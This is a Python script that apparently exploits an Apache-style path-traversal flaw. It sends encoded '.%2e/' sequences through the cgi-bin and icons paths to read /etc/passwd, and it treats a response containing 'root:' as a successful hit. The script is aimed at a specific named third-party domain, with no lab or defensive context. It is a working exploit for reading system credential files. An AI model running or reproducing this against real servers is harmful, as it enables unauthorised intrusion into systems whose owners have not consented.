import requests, re, urllib3
from urllib.request import urlopen

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    try:
        target_url = url + "cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
        myURL = urlopen(target_url, timeout=5)
        text = str(myURL.read())
        if "root:" in text:
            cgibin0 = True
        else:
            cgibin0 = False
    except:
        cgibin0 = False
    try:
        target_url = url + "icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
        myURL = urlopen(target_url, timeout=5)
        text = str(myURL.read())
        if "root:" in text:
            icons0 = True
        else:
            icons0 = False
    except:
        icons0 = False
    if cgibin0 or icons0:
        return target_url
    else:
        return False


if __name__ == '__main__':
    print(doCheck("http://edoc.aeonlife.com.cn/"))